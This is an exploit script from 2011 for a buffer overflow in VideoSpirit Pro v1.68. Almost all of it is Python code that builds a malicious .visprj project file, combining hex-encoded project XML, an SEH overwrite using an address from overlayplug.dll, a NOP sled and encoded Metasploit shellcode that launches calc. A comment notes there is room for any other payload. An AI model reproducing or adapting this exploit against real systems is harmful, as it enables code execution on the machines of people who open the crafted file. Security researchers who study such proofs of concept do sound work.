# Exploit Title: VideoSpirit Pro v1.68 Local BoF Exploit
# Date: 01/08/2011
# Author: xsploitedsec
# URL: http://www.x-sploited.com/
# Contact: xsploitedsec[at]x-sploited.com
# Software Link: http://www.verytools.com/videospirit/download.html
# Vulnerable version: v1.68
# Tested on: Windows XP SP3 Eng

# Software description #
# "VideoSpirit Pro is the most easily used Video Converter/Editor tools. For acting as a Video Editor,
# various slide effect/title/subtitle can be added to a video clip. Also, the video clip can be rotated,
# resized and warped. Multiple video/audio clips can be joined together. Converting speed is fast and
# the quality of output file is excellent."

# Vulnerability info #
# VideoSpirit Pro is prone to a buffer overflow when parsing a (.visprj) project file that
# contains an overly long "mp3" value. This is because the application fails to properly bounds
# check the data before it is passed to strcpy().

#!/usr/bin/python
import struct,sys,os

banner = (
"\r\n==============================================\n"
" VideoSpirit Pro v1.68 Local BoF PoC\n"
" Author: xsploitedsec\n URL: http://www.x-sploited.com/\n"
"==============================================\n");
print banner;

if len(sys.argv) < 2:
    print ("\r[!] Error No filename specified\n\nUsage:\n\n" +
	os.path.basename(sys.argv[0]) + " <outfile.visprj>");
    outfile = "xsploited.visprj";			#default
    defaultname = 1;
else:
	outfile = sys.argv[1];
	defaultname = 0;

# msfpayload windows/exec CMD=calc EXITFUNC=seh R | msfencode -e x86/fnstenv_mov
# -c 1 -b '\x00\x22\x0a\x0b\x1c\x0c\x2f\x21' > /tmp/encoded.txt
# [*] x86/fnstenv_mov succeeded with size 222 (iteration=1)

calc = (
"\x6a\x32\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbf"
"\xf8\x92\x62\x83\xeb\xfc\xe2\xf4\x43\x10\x1b\x62\xbf\xf8"
"\xf2\xeb\x5a\xc9\x40\x06\x34\xaa\xa2\xe9\xed\xf4\x19\x30"
"\xab\x73\xe0\x4a\xb0\x4f\xd8\x44\x8e\x07\xa3\xa2\x13\xc4"
"\xf3\x1e\xbd\xd4\xb2\xa3\x70\xf5\x93\xa5\x5d\x08\xc0\x35"
"\x34\xaa\x82\xe9\xfd\xc4\x93\xb2\x34\xb8\xea\xe7\x7f\x8c"
"\xd8\x63\x6f\xa8\x19\x2a\xa7\x73\xca\x42\xbe\x2b\x71\x5e"
"\xf6\x73\xa6\xe9\xbe\x2e\xa3\x9d\x8e\x38\x3e\xa3\x70\xf5"
"\x93\xa5\x87\x18\xe7\x96\xbc\x85\x6a\x59\xc2\xdc\xe7\x80"
"\xe7\x73\xca\x46\xbe\x2b\xf4\xe9\xb3\xb3\x19\x3a\xa3\xf9"
"\x41\xe9\xbb\x73\x93\xb2\x36\xbc\xb6\x46\xe4\xa3\xf3\x3b"
"\xe5\xa9\x6d\x82\xe7\xa7\xc8\xe9\xad\x13\x14\x3f\xd5\xf9"
"\x1f\xe7\x06\xf8\x92\x62\xef\x90\xa3\xe9\xd0\x7f\x6d\xb7"
"\x04\x06\x9c\x50\x55\x90\x34\xf7\x02\x65\x6d\xb7\x83\xfe"
"\xee\x68\x3f\x03\x72\x17\xba\x43\xd5\x71\xcd\x97\xf8\x62"
"\xec\x07\x47\x01\xde\x94\xf1\x62\xb5\xf8\x92\x62");

header = (
"\x3C\x76\x65\x72\x73\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x20"
"\x2F\x3E\x0D\x0A\x3C\x74\x72\x61\x63\x6B\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x74"
"\x79\x70\x65\x20\x76\x61\x6C\x75\x65\x3D\x22\x30\x22\x20\x2F\x3E\x0D\x0A\x20"
"\x20\x20\x20\x3C\x74\x79\x70\x65\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x20"
"\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x74\x79\x70\x65\x20\x76\x61\x6C\x75\x65"
"\x3D\x22\x32\x22\x20\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x74\x79\x70\x65\x20"
"\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x20\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x3C"
"\x74\x79\x70\x65\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x20\x2F\x3E\x0D\x0A"
"\x3C\x2F\x74\x72\x61\x63\x6B\x3E\x0D\x0A\x3C\x74\x72\x61\x63\x6B\x30\x20\x2F"
"\x3E\x0D\x0A\x3C\x74\x72\x61\x63\x6B\x31\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x69"
"\x74\x65\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x42\x6C\x75\x65\x20\x68\x69\x6C\x6C"
"\x73\x2E\x6A\x70\x67\x22\x20\x73\x65\x74\x3D\x22\x33\x22\x20\x76\x61\x6C\x75"
"\x65\x3D\x22\x30\x31\x30\x30\x30\x30\x30\x30\x35\x39\x30\x30\x30\x30\x30\x30"
"\x34\x33\x33\x41\x35\x43\x34\x34\x36\x46\x36\x33\x37\x35\x36\x44\x36\x35\x36"
"\x45\x37\x34\x37\x33\x32\x30\x36\x31\x36\x45\x36\x34\x32\x30\x35\x33\x36\x35"
"\x37\x34\x37\x34\x36\x39\x36\x45\x36\x37\x37\x33\x35\x43\x34\x31\x36\x43\x36"
"\x43\x32\x30\x35\x35\x37\x33\x36\x35\x37\x32\x37\x33\x35\x43\x34\x34\x36\x46"
"\x36\x33\x37\x35\x36\x44\x36\x35\x36\x45\x37\x34\x37\x33\x35\x43\x34\x44\x37"
"\x39\x32\x30\x35\x30\x36\x39\x36\x33\x37\x34\x37\x35\x37\x32\x36\x35\x37\x33"
"\x35\x43\x35\x33\x36\x31\x36\x44\x37\x30\x36\x43\x36\x35\x32\x30\x35\x30\x36"
"\x39\x36\x33\x37\x34\x37\x35\x37\x32\x36\x35\x37\x33\x35\x43\x34\x32\x36\x43"
"\x37\x35\x36\x35\x32\x30\x36\x38\x36\x39\x36\x43\x36\x43\x37\x33\x32\x45\x36"
"\x41\x37\x30\x36\x37\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x45\x30\x30"
"\x30\x30\x30\x30\x30\x33\x30\x30\x30\x30\x30\x30\x32\x30\x30\x30\x30\x30\x30"
"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x34\x38\x34\x32\x30\x30"
"\x30\x30\x34\x38\x34\x32\x30\x30\x30\x30\x38\x37\x34\x33\x30\x30\x30\x30\x34"
"\x38\x34\x32\x30\x30\x30\x30\x38\x37\x34\x33\x30\x30\x30\x30\x33\x45\x34\x33"
"\x30\x30\x30\x30\x34\x38\x34\x32\x30\x30\x30\x30\x33\x45\x34\x33\x34\x30\x30"
"\x31\x30\x30\x30\x30\x46\x30\x30\x30\x30\x30\x30\x30\x46\x46\x30\x30\x30\x30"
"\x30\x30\x46\x46\x46\x46\x46\x46\x46\x46\x30\x32\x30\x30\x30\x30\x30\x30\x43"
"\x38\x43\x38\x43\x38\x46\x46\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x33\x30\x30\x30\x30\x30"
"\x30\x36\x45\x36\x46\x30\x30\x45\x45\x45\x45\x45\x45\x45\x45\x30\x30\x30\x30"
"\x30\x30\x30\x30\x30\x30\x22\x20\x2F\x3E\x0D\x0A\x3C\x2F\x74\x72\x61\x63\x6B"
"\x31\x3E\x0D\x0A\x3C\x74\x72\x61\x63\x6B\x32\x20\x2F\x3E\x0D\x0A\x3C\x74\x72"
"\x61\x63\x6B\x33\x20\x2F\x3E\x0D\x0A\x3C\x74\x72\x61\x63\x6B\x34\x20\x2F\x3E"
"\x0D\x0A\x3C\x63\x6C\x69\x70\x20\x2F\x3E\x0D\x0A\x3C\x6F\x75\x74\x70\x75\x74"
"\x20\x74\x79\x70\x65\x6E\x61\x6D\x65\x3D\x22\x41\x56\x49\x22\x20\x6B\x65\x65"
"\x70\x61\x73\x70\x65\x63\x74\x3D\x22\x30\x22\x20\x70\x72\x65\x73\x65\x74\x71"
"\x75\x61\x6C\x69\x74\x79\x3D\x22\x30\x22\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x74"
"\x79\x70\x65\x30\x20\x65\x6E\x61\x62\x6C\x65\x3D\x22\x31\x22\x3E\x0D\x0A\x20"
"\x20\x20\x20\x20\x20\x20\x20\x3C\x76\x61\x6C\x69\x74\x65\x6D\x20\x6E\x61\x6D"
"\x65\x3D\x22\x6D\x73\x6D\x70\x65\x67\x34\x76\x32\x22\x20\x76\x61\x6C\x75\x65"
"\x3D\x22\x6D\x73\x6D\x70\x65\x67\x34\x76\x32\x22\x20\x2F\x3E\x0D\x0A\x20\x20"
"\x20\x20\x20\x20\x20\x20\x3C\x76\x61\x6C\x69\x74\x65\x6D\x20\x6E\x61\x6D\x65"
"\x3D\x22\x33\x32\x30\x2A\x32\x34\x30\x28\x34\x3A\x33\x29\x22\x20\x76\x61\x6C"
"\x75\x65\x3D\x22\x33\x32\x30\x2A\x32\x34\x30\x22\x20\x2F\x3E\x0D\x0A\x20\x20"
"\x20\x20\x20\x20\x20\x20\x3C\x76\x61\x6C\x69\x74\x65\x6D\x20\x6E\x61\x6D\x65"
"\x3D\x22\x33\x30\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x30\x22\x20\x2F\x3E"
"\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x76\x61\x6C\x69\x74\x65\x6D\x20"
"\x6E\x61\x6D\x65\x3D\x22\x31\x36\x30\x30\x30\x6B\x22\x20\x76\x61\x6C\x75\x65"
"\x3D\x22\x31\x36\x30\x30\x30\x6B\x22\x20\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x3C"
"\x2F\x74\x79\x70\x65\x30\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x74\x79\x70\x65\x31"
"\x20\x65\x6E\x61\x62\x6C\x65\x3D\x22\x31\x22\x3E\x0D\x0A\x20\x20\x20\x20\x20"
"\x20\x20\x20\x3C\x76\x61\x6C\x69\x74\x65\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x6D"
"\x70\x33\x22\x20\x76\x61\x6C\x75\x65\x3D\x22");

footer = (
"\x22\x20\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x76\x61\x6C\x69"
"\x74\x65\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x31\x32\x38\x6B\x22\x20\x76\x61\x6C"
"\x75\x65\x3D\x22\x31\x32\x38\x6B\x22\x20\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x20"
"\x20\x20\x20\x3C\x76\x61\x6C\x69\x74\x65\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x34"
"\x34\x31\x30\x30\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x34\x31\x30\x30\x22"
"\x20\x2F\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x76\x61\x6C\x69\x74"
"\x65\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x32\x20\x28\x53\x74\x65\x72\x65\x6F\x29"
"\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x20\x2F\x3E\x0D\x0A\x20\x20\x20"
"\x20\x3C\x2F\x74\x79\x70\x65\x31\x3E\x0D\x0A\x20\x20\x20\x20\x3C\x74\x79\x70"
"\x65\x32\x20\x65\x6E\x61\x62\x6C\x65\x3D\x22\x30\x22\x20\x2F\x3E\x0D\x0A\x3C"
"\x2F\x6F\x75\x74\x70\x75\x74\x3E\x0D\x0A");

payload = "\x41" * 104;
payload += "\xEB\x06\x90\x90"; 				#short jmp
payload += struct.pack("<L",0x100B0B94);	#p/p/r - overlayplug.dll (Apps path)
payload += "\x90" * 24;						#small nop sled
payload += calc;							#plenty of room for whatever

payload += "\x42" * (5000 - len(payload));	#junk padding

finalstr = (header + payload + footer);

if defaultname == 1:
	print("\n[!] Defaulting to xsploited.visprj");
	
print("[*] Creating malicious project file");
try:
    out_file = open(outfile,'w');
    out_file.write(finalstr);
    out_file.close();
    print("[+] File created successfully ("  + outfile + ")\n[-] Exiting...\r");
except (IOError):
    print("[!] Error: unable to create file \n[-] Exiting...\r");